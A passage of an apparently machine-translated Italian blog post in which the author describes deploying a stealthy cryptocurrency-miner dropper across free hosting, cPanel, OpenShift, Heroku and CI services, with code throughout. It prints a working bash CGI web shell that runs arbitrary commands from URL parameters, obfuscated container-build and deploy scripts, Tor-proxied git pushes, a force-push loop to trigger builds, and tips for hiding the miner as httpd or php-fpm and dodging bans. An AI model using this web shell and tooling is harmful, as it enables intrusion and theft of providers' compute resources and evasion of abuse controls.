    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>Una stranezza esasperante incontrata con bash durante la codifica del minatore è quella di assegnare una variabile con una subshell con virgolette<code>myvar="$(something)"</code> provoca un aumento permanente dell'utilizzo della memoria, è stato difficile eseguire il debug e non è stato trovato il motivo per cui si comporta in questo modo, tuttavia l'assegnazione deve essere non quotata. La decodifica invece si fa con<em> eretici</em> che è un'astrazione su file temporanei, la variabile viene scaricata in un file che viene quindi reindirizzato al processo.<p>Il ciclo di lunga durata del minatore:<ul><li><p>mentre vero<ul><li><p>ferma il minatore<li><p>rimuovi configurazione<li><p>avvia il minatore<li><p>mentre vero<ul><li><p>inizia il demone<ul><li><p>mentre il minatore è in esecuzione<ul><li><p>leggi l'output del minatore<li><p>scegli l'azione del minatore in base alla riga di output</ul></ul><li><p>se il minatore non è in esecuzione: break</ul><li><p>dormire</ul></ul><p>La riga di output viene confrontata con alcune espressioni regolari:<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>Il demone gestisce i casi in cui<ul><li><p>la connessione all'endpoint dà errori (scegliere un nuovo endpoint casuale)<li><p>l'algoritmo di hashing cambia (regola il tempo di sospensione e le configurazioni ad-hoc)<li><p>problemi del minatore (riavvia il minatore).</ul><p>Per un po' c'è stato il supporto per la dashboard di comando e controllo, che permetteva di attivare i riavvii manuali, tuttavia poiché il suo utilizzo era minimo è stato scartato e i suoi endpoint sono stati sostituiti con una connessione al pool alternativa, anche il processo di riavvio era instabile, complesso. ..un altro caso di debito tecnologico. Tuttavia ha permesso di recuperare un carico utile aggiornato e reimpostare tutte le configurazioni al volo, il che è stato piuttosto interessante, il trampolino definitivo.<h2 id=debugging><a class=header-anchor href=#debugging> Debug</a></h2><p>Ci sono tre utilità principali<ul><li><p>abilitare/disabilitare la traccia attorno ai blocchi di codice (non vogliamo tracciare un binario codificato b64 in una variabile..)<li><p>una semplice funzione per formattare i log<li><p>un flag che attivava la registrazione dettagliata in fase di esecuzione ogni volta che veniva avviato il minatore.<ul><li><p>fa il file?<code>.debug</code> esistere?<ul><li><p>abilitare la registrazione dettagliata</ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> Distribuzioni di destinazione</a></h2><p>Questa configurazione è stata testata su 3 tipi di host:<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> Contenitori o VM self-hosted</a></h3><p>A molti provider di hosting non piace il mining poiché le risorse della CPU tendono a essere condivise tra più utenti e il software di mining può facilmente rallentare un nodo host influendo sulle prestazioni per il resto degli utenti. Questo può essere vero anche se il tempo dell'utente della CPU è illimitato, perché gli algoritmi di hashing possono saturare tutti i livelli di cache della CPU se la cache è condivisa tra tutti i core della CPU.<p>Vorremmo usare il nostro<em> giusto</em> condivisione di risorse senza essere bannati, questo è un buon caso d'uso per il nostro dropper invisibile poiché è consapevole dell'utilizzo dell'host, il che significa che<em> dovrebbe</em> rimanere un po' all'interno di [AUP]. Non ci sono passaggi aggiuntivi quando si tratta di distribuzioni self-hosted, solo lo script di avvio, forse aggiunto alla sequenza di avvio o avviato manualmente.<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> Hosting web basato su cPanel</a></h3><p>I piani di abbonamento per l'hosting web sono offerti principalmente tramite [cPanel]. Anche in questo caso stiamo usando piani di abbonamento personali che hanno limiti di risorse ragionevoli, d'altra parte qualsiasi piano gratuito ha limiti ridicoli<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> . cPanel ti consente di definire gestori per diverse estensioni di file, questo ci consente di eseguire script di shell tramite il<a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> cgi</a> con una richiesta http contro uno script di shell caricato sul server. Questo tipo di interfacce sono come appaiono le web-shell<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> . Una semplice shell web bash<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span><span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span><span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span><span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span><span class=hljs-keyword>done</span><span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span><span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span><span class=hljs-comment>## don't use -n, redirect fd for bcompat</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>builtin</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span><span class=hljs-built_in>printf</span><span class=hljs-string>'exec %b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span><span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>È meglio fare affidamento solo su builtin poiché il fork di processi aggiuntivi potrebbe non essere consentito nelle jail web, ma è sempre possibile<code>exec</code> che ci consente di utilizzare la maggior parte delle utilità della riga di comando. La maggior parte delle web shell sono scritte in altri linguaggi di scripting come python o php poiché non devi preoccuparti del fork.<p>In un ambiente cpanel è meglio usare un nome statico per il processo miner, come<code>httpd</code> o<code>php-fpm</code> perché<code>cgi</code> è basato su multiprocessing, quindi i server sono sempre pieni di molti processi chiamati così, anche se un osservatore attento dovrebbe notare che<em> multi-thread</em> pattern di utilizzo decisamente non comune (o possibile) per linguaggi come perl, php, ruby ​​o python!<p>I processi hanno anche un limite di tempo per impostazione predefinita, (1 ora, 1 giorno, ecc.), per questo utilizziamo solo un cron job che riavvia il contagocce.<p>Ciò ha richiesto molte modifiche manuali, l'API cpanel per automatizzare questo sfortunatamente non è esposta agli utenti finali, quindi l'hosting web è un obiettivo goffo e noioso per il nostro contagocce di miner.<h3 id=web_environments><a class=header-anchor href=#web_environments> Ambienti web</a></h3><p>Ci sono<em> SaaS</em> provider che dispongono di un editor Web abbinato a un contenitore, come<a href="with a free tier before getting acquired by amazon"> nuvola 9</a> , [codeanywhere], [codedenvy]. La distribuzione del contagocce qui è facile (hai un ambiente completo), ma mantenerlo in esecuzione è un peso, poiché qualsiasi editor web interattivo termina la sua sessione subito dopo la chiusura della pagina web e il contenitore viene di conseguenza messo in sospensione (a meno che tu non pagare ovviamente).<p>Eludere questo può solo significare che dobbiamo mantenere aperte le sessioni, alcuni script con [burattinaio] hanno ottenuto il risultato desiderato, ma avere pagine Web di SPA di lunga durata, con perdite di memoria e gonfie è decisamente poco attraente e non furtivo, perché dal backend del provider, una sessione aperta 24 ore su 24, 7 giorni su 7, sembrerà sicuramente sospetta. In effetti, anche gli ambienti web sono obiettivi goffi e noiosi.<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> Servizi di app gratuiti</a></h3><p>Questo è principalmente<a href="when it used to have a free tier"> openshift</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> e [heroku]. Openshift, essendo Kubernetes, era in qualche modo semplice da implementare, ma pieno di abbandono di configurazione, ecco un estratto:<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment>## beware the newline ^^^</span><span class=hljs-built_in>cd</span><span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span><span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(cat vars) || { <span class=hljs-built_in>echo</span><span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span><span class=hljs-comment>## preserve escapes</span>
script=$(cat <span class=hljs-variable>$launcher</span> | tail +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
cat <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span><span class=hljs-variable>$obfs</span><span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
cat <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span><span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
chmod +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>Questo era lo script utilizzato per creare il contenitore minerario che richiedeva un modello yaml:<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span><span class=hljs-string>build.openshift.io/v1</span><span class=hljs-attr>kind:</span><span class=hljs-string>BuildConfig</span><span class=hljs-attr>metadata:</span><span class=hljs-attr>labels:</span><span class=hljs-attr>build:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>spec:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>5184000</span><span class=hljs-attr>failedBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>successfulBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>resources:</span><span class=hljs-attr>limits:</span><span class=hljs-attr>cpu:</span><span class=hljs-number>2</span><span class=hljs-attr>memory:</span><span class=hljs-string>1Gi</span><span class=hljs-attr>runPolicy:</span><span class=hljs-string>Serial</span><span class=hljs-attr>source:</span><span class=hljs-attr>type:</span><span class=hljs-string>Binary</span><span class=hljs-attr>strategy:</span><span class=hljs-attr>sourceStrategy:</span><span class=hljs-attr>from:</span><span class=hljs-attr>kind:</span><span class=hljs-string>ImageStreamTag</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}-build:latest</span><span class=hljs-attr>namespace:</span><span class=hljs-string>${OC_PRJ}</span><span class=hljs-attr>type:</span><span class=hljs-string>Source</span><span class=hljs-attr>template:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>2400</span><span class=hljs-attr>triggers:</span><span class=hljs-bullet>-</span><span class=hljs-attr>generic:</span><span class=hljs-attr>secretReference:</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>type:</span><span class=hljs-string>Generic</span></code></pre><p>Ma l'intero processo ha richiesto molti passaggi!<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span><span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span><span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span><span class=hljs-built_in>exit</span><span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span>
mv <span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(date +%s)}</code></pre><p>In pseudo codice:<ul><li><p>creare il progetto<li><p>creare l'applicazione senza un'immagine<li><p>costruisci il container minerario<li><p>distribuire il contenitore con una configurazione di distribuzione (astrazione di kubernetes)<li><p>implementare la distribuzione</ul><p>Il<code>build-build</code> script invece creato a<em> costruire</em>contenitore che sarebbe estratto per poche ore alla volta. Le build e i pod normali hanno risorse separate in openshift, quindi le abbiamo sfruttate entrambe. Openshift è stata nel complesso una brutta esperienza poiché ha superato 4 versioni diverse (forse di più, ho smesso di tracciare dopo un po') e ognuna di esse ha richiesto modifiche alle configurazioni, non avevano percorsi di aggiornamento e tutto è stato rapidamente ripetuto, ed era comune perché le build / i pod si bloccassero e non venivano raccolti nella spazzatura ... di solito eseguivano riavvii manuali di tanto in tanto, forse kubernetes era solo bacato :)<p>La configurazione di Heroku era un po' più semplice (non coinvolge Kubernetes). A parte la build del contenitore, che era simile a quella di openshift, il resto erano solo due comandi cli<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span><span class=hljs-variable>$TYPE</span></code></pre><p>Il contenitore è stato inviato direttamente con docker al registro heroku.<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> L'attrito con heroku (il cui livello gratuito è ancora in piedi al momento della scrittura) è che i dynos possono funzionare solo per 22 giorni al mese, quindi hanno richiesto una gestione manuale ogni mese, ancora una volta goffo e noioso. Hanno eseguito alcune onde di ban all'inizio, e poi hanno disabilitato le registrazioni tramite TOR, sono abbastanza sicuro di essere la causa di questo.<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> Contenitori CI o VM</a></h3><p>Questi erano gli obiettivi più sinergici per il nostro contagocce. Ci sono molti<a href=https://en.wikipedia.org/wiki/Continuous_integration> CI</a> società, molte delle quali stanno bruciando i soldi degli investitori offrendo livelli gratuiti nella speranza di raccogliere una quota di mercato nel settore delle infrastrutture tecnologiche.<p>Tutti questi servizi offrono risorse diverse, hanno requisiti di configurazione diversi e funzionano in ambienti diversi. Non ho mai pensato di automatizzare la registrazione dell'account perché questo tipo di cose sono terribili da programmare, cerco sempre di evitarle, quindi ho appena sopportato le registrazioni manuali per un po' perché ero curioso di sapere che tipo di risposta anti spam avrei ricevuto (e quanto diverso dal resto!). Puoi intuire alcune cose sulla gestione di un'azienda da come gestisce lo spam:<ul><li><p>Esegue le onde di divieto? Quindi hanno politiche non rigide, i problemi vengono gestiti manualmente e caso per caso<li><p>Richiede la verifica telefonica? Sono stati già abusati in passato<li><p>Rispondono a un uso intensivo delle risorse? Stanno correndo con un budget limitato<li><p>Applicano restrizioni all'account o divieti ombra? Se fanno shadow ban, hanno amministratori di sistema cattivi.</ul><p>C'è anche una domanda filosofica: se un servizio ti consente di abusare del loro sistema per molto tempo, significa che hanno un'infrastruttura di alto livello in grado di gestire il carico o semplicemente uno scarso controllo sul loro sistema? E devi considerare l'equilibrio tra accessibilità e sicurezza, un sistema troppo sicuro può ridurre la fidelizzazione degli utenti.<p>Ecco una tabella che mostra alcuni servizi a cui ho distribuito:<table><tbody><tr class="header headerLastRow"><th style=text-align:center>ci<th style=text-align:center>configurazione<th style=text-align:center>prestazione<th style=text-align:center>martello-divieto<tr><td style=text-align:center>Bitrise<td style=color:red;text-align:center>cattivo<td style=color:#ff0;text-align:center>medio<td style=color:#ff0;text-align:center>medio<tr><td style=text-align:center>travis<td style=color:green;text-align:center>Buona<td style=color:#ff0;text-align:center>medio<td style=color:green;text-align:center>Buona<tr><td style=text-align:center>Coordinamento<td style=color:#ff0;text-align:center>medio<td style=color:red;text-align:center>cattivo<td style=color:#ff0;text-align:center>medio<tr><td style=text-align:center>Gitlab<td style=color:#ff0;text-align:center>medio<td style=color:green;text-align:center>Buona<td style=color:green;text-align:center>Buona<tr><td style=text-align:center>Cerchio<td style=color:red;text-align:center>cattivo<td style=color:green;text-align:center>Buona<td style=color:#ff0;text-align:center>medio<tr><td style=text-align:center>Semaforo<td style=color:green;text-align:center>Buona<td style=color:green;text-align:center>Buona<td style=color:#ff0;text-align:center>medio<tr><td style=text-align:center>Docker<td style=color:#ff0;text-align:center>medio<td style=color:#ff0;text-align:center>medio<td style=color:green;text-align:center>Buona<tr><td style=text-align:center>Banchina<td style=color:green;text-align:center>Buona<td style=color:#ff0;text-align:center>medio<td style=color:#ff0;text-align:center>medio<tr><td style=text-align:center>Codice aggiornato<td style=color:red;text-align:center>cattivo<td style=color:green;text-align:center>Buona<td style=color:#ff0;text-align:center>medio<tr><td style=text-align:center>Wercker<td style=color:#ff0;text-align:center>medio<td style=color:#ff0;text-align:center>medio<td style=color:red;text-align:center>cattivo<tr><td style=text-align:center>Azure-oleodotti<td style=color:#ff0;text-align:center>medio<td style=color:#ff0;text-align:center>medio<td style=color:red;text-align:center>cattivo<tr><td style=text-align:center>Continuophp<td style=color:red;text-align:center>cattivo<td style=color:#ff0;text-align:center>medio<td style=color:#ff0;text-align:center>medio<tr><td style=text-align:center>compagno<td style=color:red;text-align:center>cattivo<td style=color:red;text-align:center>cattivo<td style=color:red;text-align:center>cattivo<tr><td style=text-align:center>drone<td style=color:red;text-align:center>cattivo<td style=color:green;text-align:center>Buona<td style=color:red;text-align:center>cattivo<tr><td style=text-align:center>Applicatore<td style=color:red;text-align:center>cattivo<td style=color:#ff0;text-align:center>medio<td style=color:red;text-align:center>cattivo<tr><td style=text-align:center>Non codificare mai<td style=color:red;text-align:center>cattivo<td style=color:green;text-align:center>Buona<td style=color:#ff0;text-align:center>medio<tr><td style=text-align:center>Zeist/vercel<td style=color:red;text-align:center>cattivo<td style=color:green;text-align:center>Buona<td style=color:red;text-align:center>cattivo</table><p>In questo contesto, a<span style=color:green> Buona</span> configurazione significa che non ci è voluto molto tempo per configurare a<code>ci</code> lavoro per il processo di mining (come tutti i servizi che si basano su una dashboard web anziché su un file di punti del repository erano un lavoro ingrato), un<span style=color:red> cattivo</span><code>ban-hammer</code> significa che era difficile registrarsi al servizio o che gli account sarebbero stati bannati in modo più aggressivo.<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> Bitrise</a> richiede di impostare un progetto, dedurre l'ambiente, l'architettura di destinazione, il processo di esecuzione e altre cose, è stato molto dispendioso in termini di tempo impostare una build, quindi ha ottenuto una valutazione negativa nella configurazione.<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> Continuophp</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> compagno</a> , [Codefresh] aveva anche molti passaggi di configurazione manuali non dichiarativi.<p>Servizi come [Azure-pipelines],<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> Wercker</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> compagno</a> applica i ban shadow sugli account, i ban shadow sono cattivi, poiché ti lasciano indovinare se c'è qualcosa di sbagliato nella tua configurazione o meno. Con alcuni servizi puoi indovinare il motivo del divieto (praticamente la tua build ha impiegato troppo tempo o hai creato troppe volte in un breve periodo), per altri come [Azure-pipelines] presumo che abbiano applicato una sorta di impronta digitale ai repository degli utenti poiché i divieti stavano arrivando anche senza alcun abuso di risorse, anche Azure e Vercel erano limitati<code>DNS</code> l'accesso all'interno di macchine di costruzione pubblica, quindi questo era un ulteriore attrito che doveva essere superato con un tunnel ad hoc.<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> drone</a> ha dato accesso a un intero processore da 16+ core ma è finito per essere vietato dopo 2 build<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> Coordinamento</a> dà anche accesso a potenti host di build e non è vietato in modo aggressivo come il drone.<p>I miei servizi preferiti non per la redditività ma per la facilità e la convenienza (anche con altri progetti) erano<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> travis</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> Semaforo</a> e<a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> Docker-hub</a>. Travis è come il CI standard ed è molto flessibile, Semaphore è l'unico<code>DSL</code> per<code>CI</code> che sembrava accessibile e ben fatto invece di una sequenza infinita di caselle di controllo spaghettificate come altre interfacce utente e Docker solo per la semplicità di mappare i dockerfile alle build.<h3 id=builds_configs><a class=header-anchor href=#builds_configs> Crea configurazioni</a></h3><p>Le build sono state attivate da lavori cron offerti da servizi Web o da commit git. Quindi dovevi tenere traccia di una quantità di token di accesso o chiavi ssh per gestire tutti i commit git. Era anche importante non inviare oltre lo spam ai commit e utilizzare i proxy quando si esegue il push ai repository che configurano git:<pre><code class="toml hljs"><span class=hljs-section>[http]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[https]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[url "https://"]</span><span class=hljs-attr>insteadOf</span> = git://</code></pre><p>Utilizzando i servizi di hosting git, github è stato quello più approfondito sui divieti, ma sono stati eseguiti solo su segnalazioni di abuso da parte degli amministratori dei servizi ci, gitlab ha eseguito un'ondata di ban una volta, quando ho provato a rinnovare il processo CI (con noncuranza). Non ho mai ricevuto un ban per un account bitbucket. Per (forzare) eseguire il push di git commit, abbiamo un ciclo di lunga durata che tagga nuovamente il repository git:<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(ls -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span><span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span><span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span>
        sleep <span class=hljs-variable>$repos_ival</span><span class=hljs-keyword>done</span>
    sleep 1
<span class=hljs-keyword>done</span></code></pre><p>Potrebbe essere possibile che la forza che spinge in questo modo non sia qualcosa che piace molto a github e potrebbe essere stata una causa per la segnalazione degli account. La funzione tagger incaricata di forzare il push di un commit diverso, utilizza un sito Web (che puoi cercare abbastanza facilmente) che fornisce alcuni commit casuali. Non sono sicuro di quanto questo aiuti, dal momento che il contenuto stesso dei commit è ovviamente sospetto per il mio caso. E mi ha anche morso nel culo una volta, dal momento che i commit restituiti da questo comando possono includere parolacce, uno dei miei commit è stato raccolto da un bot di Twitter che tiene traccia dei commit git con parolacce! Ho aggiunto una lista nera per le parolacce dopo l'incidente.<p>Non ho davvero approfondito i commit git offuscati e i repository git offuscati. L'unico caso in cui stavo usando un repository più elaborato era con Bitrise poiché non era possibile configurare una build se il sistema non riconosceva un ambiente (come le app mobili), ma anche in quel caso non c'era alcuna rotazione ed era sempre lo stesso repository, abbastanza facile da individuare.<p>Nel complesso, se dovessi tracciare una curva a campana attorno al momento ottimale per il mio<em> privo di</em>ottenere account bannati, in tutti i servizi testati, sarebbe con un centro di circa 1 ora di durata della build, una volta al giorno. Per i core della CPU, a parte un paio di bugiardi (come i droni), la maggior parte dei servizi si aspetta che tu utilizzi l'intera quantità di risorse che ti viene fornita poiché le build vengono eseguite all'interno di VM o contenitori con risorse vincolate... e la compilazione è solitamente un'attività che satura la CPU, quindi non ha rilevanza statistica. Intuitivamente una build al giorno è ciò che farebbe lo sviluppatore medio, quindi dovresti aspettarti bandiere sollevate se ti allontani dalla media e spingere per gli abusi non finisce mai bene.<h2 id=conclusions><a class=header-anchor href=#conclusions> Conclusioni</a></h2><p>Ne valeva la pena? Le parti di rete erano decisamente interessanti, occuparsi delle registrazioni degli account era ovviamente la parte peggiore, a nessuno piace fare clic su infinite e-mail di conferma e ripetere le procedure dell'interfaccia utente che intorpidiscono la mente, dopotutto. Anche scrivere software di automazione dello spam è noioso (perché per lo più frughi su API stupide) e con questo presupposto (e il fatto che questo non sia mai stato nulla di serio) non l'ho mai nemmeno considerato. È stato redditizio? Al suo apice stava raggiungendo qualcosa come<code>300$</code> al mese, forse abbastanza per un venezuelano, non proprio per me :)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> il burbero amministratore di sistema</em></table><table class=fndef 